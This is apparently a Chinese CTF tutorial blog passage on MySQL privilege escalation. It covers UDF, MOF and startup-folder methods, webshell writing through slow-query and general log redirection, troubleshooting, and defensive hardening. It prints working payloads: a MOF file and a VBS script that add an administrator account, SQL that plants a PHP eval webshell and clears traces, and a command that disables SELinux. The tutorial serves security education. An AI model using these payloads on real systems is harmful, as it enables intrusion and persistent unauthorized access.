NTFS ADS（Alternate Data Streams，交替数据流）是Windows NTFS文件系统的一个特性。简单来说，NTFS文件系统中每个文件都可以有"主数据流"和"备用数据流"。`::$INDEX_ALLOCATION`是一个特殊的ADS名称，它代表一个目录的索引。当你在文件路径中使用`::$INDEX_ALLOCATION`时，Windows会创建对应的目录。

```sql
-- 假设plugin_dir是 C:\Program Files\MySQL\MySQL Server 5.7\lib\plugin\
-- 但plugin目录不存在，需要先创建

-- 利用NTFS ADS创建plugin目录
SELECT 'test' INTO OUTFILE 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin::$INDEX_ALLOCATION';

-- 创建成功后，就可以正常写入.dll文件了
SELECT 0x4d5a...完整十六进制... INTO DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/udf.dll';
```

⚠️ **注意**：
1. 路径中使用正斜杠`/`或双反斜杠`\\`，不能用单个反斜杠（会被当成转义符）
2. 此方法只在NTFS文件系统上有效（Windows默认就是NTFS）
3. 需要MySQL服务进程有对`lib`目录的写入权限

### Linux特有问题：文件权限

Linux系统对文件权限控制更严格，可能遇到以下问题：

```bash
# 问题1：plugin_dir目录没有写入权限
ls -la /usr/lib/mysql/plugin/
# 如果权限是 drwxr-xr-x 且所有者是root，mysql用户无法写入

# 解决方法：如果MySQL以root运行，则不会有此问题
# 在CTF中，MySQL通常以root运行

# 问题2：SELinux阻止文件加载
# 检查SELinux状态
getenforce
# 如果输出 Enforcing，说明SELinux开启，可能会阻止加载.so文件

# 临时关闭SELinux（需要root权限）
setenforce 0
```

### 32位 vs 64位

**必须使用与目标系统架构匹配的文件**，否则会加载失败。

```sql
-- 查看系统架构
SHOW VARIABLES LIKE 'version_compile_machine';
-- 输出 x86_64 → 64位系统，使用64位的.so/.dll
-- 输出 i686 或 i386 → 32位系统，使用32位的.so/.dll
```

| 系统架构 | version_compile_machine值 | 应使用的文件 |
|---------|-------------------------|------------|
| 64位 | `x86_64` | `linux/64/lib_mysqludf_sys.so` 或 `windows/64/lib_mysqludf_sys_64.dll` |
| 32位 | `i686` / `i386` | `linux/32/lib_mysqludf_sys.so` 或 `windows/32/lib_mysqludf_sys_32.dll` |

---

## 三种MySQL提权方法对比

网上常说的"三种MySQL提权方法"指的是**UDF提权、MOF提权和启动项提权**。这三种方法都是利用MySQL的高权限账号，从数据库层面突破到操作系统层面。

### 对比总览

| 提权方法 | 核心原理 | 适用系统 | 当前实用性 | 难度 |
|---------|---------|---------|-----------|------|
| **UDF提权** | 加载恶意动态库执行系统命令 | Windows + Linux | ⭐⭐⭐⭐⭐ 最常用 | 中等 |
| **MOF提权** | 利用WMI自动执行.mof文件 | 仅Windows Server 2003及以前 | ⭐ 已淘汰 | 低 |
| **启动项提权** | 将恶意脚本写入开机启动目录 | 仅Windows | ⭐⭐ 受限 | 低 |

### 1. UDF提权（最主流，本文重点）

这是三种方法中**适用性最广、最常用**的一种，也是本文详细讲解的方法。

**优势**：
- Windows和Linux都支持
- 从MySQL 5.0到8.0各个版本都有对应方法
- 一旦成功，可以直接执行任意系统命令

**关键条件**：
- `secure_file_priv`为空
- 能写入`plugin_dir`目录
- 有`FILE`和`SUPER`权限

详细操作步骤见前文[实战操作详细步骤](#实战操作详细步骤)。

### 2. MOF提权（已淘汰，了解即可）

#### 原理

Windows系统有一个叫WMI（Windows Management Instrumentation）的管理框架。这个框架会定期（大约每5秒）扫描`%SystemRoot%\System32\wbem\MOF\`目录，并自动执行里面的`.mof`文件。

攻击者可以利用MySQL的写文件功能，将一个恶意的`.mof`文件写入这个目录，WMI就会自动执行它，从而以SYSTEM权限执行系统命令。

#### 恶意MOF文件示例

```mof
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
    EventNamespace = "Root\\Cimv2";
    Name = "filtP2";
    Query = "Select * From __InstanceModificationEvent "
            "Where TargetInstance Isa \"Win32_LocalTime\" "
            "And TargetInstance.Second = 5";
    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $Consumer
{
    Name = "consPCSV2";
    ScriptingEngine = "JScript";
    ScriptText =
        "var WSH = new ActiveXObject(\"WScript.Shell\")\n"
        "WSH.run(\"net user hacker P@ssw0rd /add\")\n"
        "WSH.run(\"net localgroup administrators hacker /add\")\n";
};

instance of __FilterToConsumerBinding
{
    Consumer = $Consumer;
    Filter = $EventFilter;
};
```

这个MOF文件的作用：每分钟的第5秒，自动执行添加管理员用户的命令。

#### 操作步骤

```sql
-- 将MOF文件写入WMI目录
SELECT 0x23707261676D61...（MOF文件的十六进制） INTO DUMPFILE 'C:/Windows/System32/wbem/mof/test.mof';
```

#### 为什么已淘汰

从Windows Server 2008开始，微软修复了WMI自动执行MOF文件的机制：
- 新版Windows不再自动执行MOF目录中的文件
- 即使能写入文件，也不会被执行

**结论**：在CTF中几乎不会遇到可用的MOF提权，了解原理即可。

### 3. 启动项提权（受限）

#### 原理

Windows系统有"开机启动项"功能，放在启动目录中的脚本或程序会在系统启动时自动执行（以SYSTEM权限）。

攻击者可以利用MySQL的写文件功能，将一个恶意脚本写入启动目录，等服务器重启后自动执行。

#### 常见的启动目录路径

```
# 所有用户启动目录（需要管理员权限写入）
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\

# 当前用户启动目录
C:\Users\<用户名>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```

#### 恶意脚本示例

```vbs
' 创建一个VBS脚本，添加管理员用户
Set ws = CreateObject("WScript.Shell")
ws.Run "net user hacker P@ssw0rd /add", 0
ws.Run "net localgroup administrators hacker /add", 0
```

#### 操作步骤

```sql
-- 将VBS脚本写入启动目录
SELECT 0x...（VBS文件的十六进制） INTO DUMPFILE 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/adduser.vbs';
```

#### 关键限制

**最大的问题：需要服务器重启！**

- 脚本只在服务器重启后才会执行
- 在CTF比赛环境中，通常无法触发服务器重启
- 即使能写入文件，也可能等不到执行的机会

**结论**：启动项提权在CTF中实用性较低，但在某些特定场景（如已知服务器会定期重启）下可以考虑。

---

## secure_file_priv受限时的替代方案

如果`secure_file_priv`的值不是空字符串（比如是`NULL`），你就无法使用`INTO DUMPFILE`写文件，常规的UDF提权方法就走不通了。但还有替代方案：

### 方法1：利用慢查询日志GetShell

MySQL的慢查询日志会记录执行时间超过阈值的SQL语句。我们可以修改日志文件路径，让它指向Web目录下的一个PHP文件，然后执行一条包含PHP代码的慢查询，这样PHP代码就会被写入日志文件。

```sql
-- ① 查看慢查询日志状态
SHOW VARIABLES LIKE '%slow%';

-- ② 开启慢查询日志
SET GLOBAL slow_query_log = ON;

-- ③ 修改慢查询日志文件路径为Web目录下的PHP文件
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';

-- ④ 设置慢查询阈值为0（所有查询都会被记录）
SET GLOBAL long_query_time = 0;

-- ⑤ 执行一条包含PHP代码的查询
SELECT '<?php @eval($_POST["cmd"]); ?>' OR SLEEP(1);
-- 这条语句会被记录到慢查询日志中
-- 日志文件路径已经指向了shell.php
-- 所以PHP代码就被写入了shell.php

-- ⑥ 恢复慢查询日志设置（清理痕迹）
SET GLOBAL slow_query_log = OFF;
SET GLOBAL long_query_time = 10;
```

### 方法2：利用General日志GetShell

General日志会记录MySQL的所有操作，同样可以修改日志路径来实现写文件。

```sql
-- ① 查看General日志状态
SHOW VARIABLES LIKE '%general%';

-- ② 开启General日志
SET GLOBAL general_log = ON;

-- ③ 修改General日志文件路径
SET GLOBAL general_log_file = '/var/www/html/shell.php';

-- ④ 执行一条包含PHP代码的查询
SELECT '<?php @eval($_POST["cmd"]); ?>';

-- ⑤ 关闭General日志
SET GLOBAL general_log = OFF;
```

💡 **提示**：这两种方法写入的是PHP文件（Webshell），而不是UDF的.so/.dll文件。所以它们不是直接实现UDF提权，而是帮助你获取一个更方便的Webshell。详细的操作说明可以参考 [SQL注入GetShell技术详解]({{ site.baseurl }}{% post_url 2026-04-10-sql-injection-getshell-guide %})。

⚠️ **注意**：这两种方法需要MySQL服务进程对Web目录有写入权限。在CTF中通常满足这个条件。

---

## 避坑指南

新手在做题时，80%的失败都卡在下面这些问题上。遇到问题时，按照排查流程一步步检查。

### 坑1：secure_file_priv不为空

**症状**：执行`INTO DUMPFILE`时报错：

```
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

**排查流程**：

```
1. 执行 SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';
   ↓
2. 检查Value值：
   ├─ 空字符串 → 正常，不是这个问题
   ├─ 具体路径（如/tmp/） → 尝试写入该路径，但可能无法写入plugin_dir
   └─ NULL → 常规方法走不通
   ↓
3. 如果是NULL或受限路径：
   ├─ 尝试慢查询日志方法（见上文）
   ├─ 尝试General日志方法（见上文）
   └─ 检查是否有其他提权路径（如内核漏洞、SUID等）
```

### 坑2：plugin目录不存在（Windows）

**症状**：执行`INTO DUMPFILE`时报错：

```
ERROR 1 (HY000): Can't create/write to file 'C:\Program Files\MySQL\MySQL Server 5.7\lib\plugin\udf.dll' (Errcode: 2)
```

Errcode 2表示"文件或目录不存在"。

**排查流程**：

```
1. 确认plugin_dir路径
   SHOW VARIABLES LIKE 'plugin_dir';
   ↓
2. 检查目录是否存在（在Webshell中执行）
   dir "C:\Program Files\MySQL\MySQL Server 5.7\lib\plugin"
   ↓
3. 如果目录不存在：
   ├─ 使用NTFS ADS创建目录（见Windows与Linux差异详解）
   └─ 如果ADS方法也失败，尝试其他路径或方法
```

### 坑3：文件写入成功但函数创建失败

**症状**：执行`CREATE FUNCTION`时报错：

```
ERROR 1126 (HY000): Can't open shared library 'udf.so' (errno: 11 wrong ELF class: ELFCLASS32)
```

**排查流程**：

```
1. 检查错误信息：
   ├─ "wrong ELF class" → 位数不匹配（用了32位文件但系统是64位，或反之）
   │   → 重新获取正确位数的文件
   ├─ "Can't open shared library" → 文件路径错误或文件损坏
   │   → 检查文件是否在plugin_dir目录下，确认文件完整
   ├─ "Permission denied" → 文件权限不足
   │   → 检查文件权限：chmod 755 /usr/lib/mysql/plugin/udf.so
   └─ "Function already exists" → 函数已存在
       → 先删除：DROP FUNCTION sys_eval; 然后重新创建
```

### 坑4：命令执行无回显

**症状**：`sys_eval`返回空字符串，`sys_exec`返回非0值。

**排查流程**：

```
1. 先测试最简单的命令
   SELECT sys_eval('id');
   ↓
2. 如果返回空：
   ├─ 检查函数是否正确创建：SELECT * FROM mysql.func;
   ├─ 检查MySQL服务用户：SELECT sys_eval('whoami');
   │   如果whoami也返回空，说明函数可能没有正确加载
   └─ 尝试用sys_exec将结果写入文件：
       SELECT sys_exec('id > /tmp/test.txt');
       然后通过Webshell查看/tmp/test.txt的内容
```

### 坑5：INTO DUMPFILE报文件已存在

**症状**：

```
ERROR 1086 (HY000): File '/usr/lib/mysql/plugin/udf.so' already exists
```

**原因**：`INTO DUMPFILE`不能覆盖已存在的文件。

**解决方案**：

```sql
-- 方法1：先删除旧文件（需要有文件删除权限）
-- 在Webshell中执行：
-- rm /usr/lib/mysql/plugin/udf.so

-- 方法2：换一个文件名
SELECT 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/udf2.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf2.so';
```

### 坑6：十六进制字符串不完整

**症状**：文件写入成功但函数创建失败，提示文件格式错误。

**原因**：复制十六进制字符串时漏掉了一部分，导致写入的文件不完整。

**排查方法**：

```sql
-- 检查写入文件的大小
-- 在Webshell中执行：
-- ls -la /usr/lib/mysql/plugin/udf.so
-- 对比原始文件大小，如果明显偏小，说明十六进制不完整

-- 重新生成并完整复制十六进制字符串
```

💡 **提示**：为避免复制不完整，建议将十六进制字符串保存到文件中，然后通过脚本构造SQL语句，而不是手动复制粘贴。

---

## 防御措施

了解攻击手法后，也要知道如何防御。以下是针对UDF提权的防御措施，每条都解释了**为什么有效**。

### 1. 限制secure_file_priv

```ini
# my.cnf 或 my.ini 配置文件
[mysqld]
# 限制文件导入导出目录（推荐设置为特定目录，不要留空）
secure_file_priv = /tmp

# 或者完全禁止导入导出（最严格，但可能影响正常业务如数据备份）
# secure_file_priv = NULL
```

**为什么有效**：UDF提权必须用`INTO DUMPFILE`写文件到`plugin_dir`。如果`secure_file_priv`限制了写入目录，攻击者就无法将恶意文件写入插件目录。

### 2. 最小权限原则

```sql
-- 不要让Web应用使用root账号连接数据库
-- 创建一个只有必要权限的专用账号
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON webapp.* TO 'app_user'@'localhost';

-- 明确禁止FILE权限（FILE权限是INTO DUMPFILE所必需的）
REVOKE FILE ON *.* FROM 'app_user'@'localhost';

-- 禁止SUPER权限（SUPER权限是修改全局变量所必需的）
REVOKE SUPER ON *.* FROM 'app_user'@'localhost';
```

**为什么有效**：
- 没有`FILE`权限，就无法执行`INTO DUMPFILE`写文件
- 没有`SUPER`权限，就无法修改全局变量（如日志路径）
- 即使Web应用被攻破，攻击者也无法利用数据库进行提权

### 3. 保护数据库密码

```php
<?php
// 不要把数据库密码写在Web根目录的配置文件中
// 不要使用root账号连接数据库
// 不要使用弱密码

// 错误示范 ❌
$db_user = 'root';
$db_pass = '123456';

// 正确示范 ✅
$db_user = 'app_readonly';
$db_pass = 'X9#kL2$mP5!qR8@w';
?>
```

**为什么有效**：UDF提权的前提是获取数据库高权限账号。如果密码足够强且不使用root账号，攻击者即使拿到配置文件也无法进行提权。

### 4. 文件系统权限加固

```bash
# plugin_dir目录只允许root写入，mysql用户只读
chown root:root /usr/lib/mysql/plugin/
chmod 755 /usr/lib/mysql/plugin/

# Web目录禁止数据库用户写入
chown -R www-data:www-data /var/www/html/
# 确保mysql用户无法写入Web目录

# 使用chroot限制MySQL进程
# chroot（change root）是一种将进程限制在指定目录中的技术
# 被chroot的MySQL进程无法访问chroot目录之外的文件
# 这样即使被UDF提权，攻击者也只能在受限目录中操作
```

**为什么有效**：
- `plugin_dir`不可写 → 无法上传恶意.so/.dll文件
- Web目录对mysql不可写 → 无法通过日志方式写入Webshell
- chroot → 即使提权成功，攻击范围也被限制

### 5. 监控和审计

```sql
-- 定期检查是否有异常的自定义函数
SELECT * FROM mysql.func;
-- 正常情况下这个表应该是空的，如果有sys_eval、sys_exec等函数，说明可能被攻击

-- 定期检查plugin目录是否有可疑文件
-- 在系统层面执行：
-- ls -la /usr/lib/mysql/plugin/
-- 正常情况下只有MySQL自带的插件文件

-- 开启MySQL审计日志
-- 在my.cnf中配置：
-- [mysqld]
-- audit_log = ON
```

**为什么有效**：即使攻击成功，通过定期检查也可以及时发现异常函数和文件，从而快速响应。

---

## 参考资源

### 相关博客

- [SQL注入GetShell技术详解]({{ site.baseurl }}{% post_url 2026-04-10-sql-injection-getshell-guide %}) - 与UDF提权形成知识互补，包含慢查询日志和General日志的详细操作
- [文件上传漏洞详解]({{ site.baseurl }}{% post_url 2026-03-07-file-upload-vulnerability %}) - 获取Webshell的常用方法，是UDF提权的前置步骤

### 在线资源

- [CTF Wiki - MySQL注入](https://ctf-wiki.org/web/sqli/) - CTF Wiki的SQL注入专题
- [狼组安全团队 - SQL注入知识库](https://wiki.wgpsec.org/knowledge/ctf/sql.html) - 中文安全知识库
- [MySQL官方文档 - 安全](https://dev.mysql.com/doc/refman/8.0/en/security.html) - MySQL安全配置官方指南
- [Exploit-DB MySQL UDF](https://www.exploit-db.com/search?q=mysql+udf) - UDF相关漏洞和利用代码

### 工具推荐

| 工具 | 用途 | 说明 |
|-----|------|------|
| **SQLMap** | 自动化SQL注入 + UDF提权 | 内置UDF文件和自动化提权功能，命令：`sqlmap -u URL --os-shell` |
| **Metasploit** | 渗透测试框架 | 包含`exploit/multi/mysql/mysql_udf_payload`模块 |
| **蚁剑（AntSword）** | Webshell管理 | 内置数据库管理功能，方便执行SQL语句 |
| **D盾** | Webshell检测 | 用于检测和清理Webshell |

### 推荐书籍

- 《Web安全深度剖析》- 全面讲解Web安全攻防
- 《白帽子讲Web安全》- 国内经典Web安全入门书
- 《渗透测试实战》- 实战导向的渗透测试指南

---

## 总结与学习路线

### 核心知识回顾

| 知识点 | 一句话总结 |
|-------|----------|
| UDF是什么 | MySQL允许用户加载外部代码文件来添加自定义函数 |
| UDF提权是什么 | 加载一个能执行系统命令的恶意函数，从数据库权限跳到系统权限 |
| 前置条件 | Webshell + MySQL root + secure_file_priv为空 + plugin_dir可写 |
| 核心操作 | 十六进制写入.so/.dll → CREATE FUNCTION → SELECT sys_eval() |
| 关键区分 | MySQL root ≠ 系统root，提权获得的是MySQL进程的系统权限 |

### 学习路线建议

```
第1阶段：基础
├─ 学习SQL基础语法
├─ 了解MySQL用户和权限体系
└─ 了解Linux/Windows基本命令

第2阶段：攻击链上游
├─ 学习SQL注入原理和利用
├─ 学习文件上传漏洞
└─ 学习如何获取Webshell

第3阶段：提权（本文内容）
├─ 理解UDF提权原理
├─ 在本地环境练习完整操作流程
└─ 了解MOF提权和启动项提权

第4阶段：进阶
├─ 学习secure_file_priv受限时的替代方案
├─ 学习其他提权方式（SUID、内核漏洞等）
└─ 学习防御和加固措施

第5阶段：实战
├─ 在CTF比赛中实践
├─ 在合法授权的靶场中练习
└─ 从攻防双向理解安全
```

### 本地练习建议

搭建本地靶场是最安全的学习方式：

```bash
# 使用Docker快速搭建MySQL环境
docker run -d \
  --name mysql-udf-lab \
  -e MYSQL_ROOT_PASSWORD=root123 \
  -p 3306:3306 \
  mysql:5.7

# 连接后手动设置secure_file_priv为空（需要在配置文件中修改）
# 然后按照本文的步骤进行练习
```

⚠️ **再次提醒**：本文所有内容仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

---

*本文最后更新于：2026年4月28日*
